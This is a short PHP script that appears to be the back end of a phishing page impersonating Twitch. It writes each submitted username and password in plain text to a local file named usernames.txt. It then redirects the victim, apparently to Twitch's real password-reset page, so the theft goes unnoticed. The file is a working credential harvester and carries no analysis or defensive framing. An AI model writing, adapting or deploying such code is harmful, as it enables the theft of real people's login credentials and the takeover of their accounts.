<?php
file_put_contents("usernames.txt", "Twitch Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://passport.twitch.tv/password_resets/new?
header("Location: $url");
exit();
?>
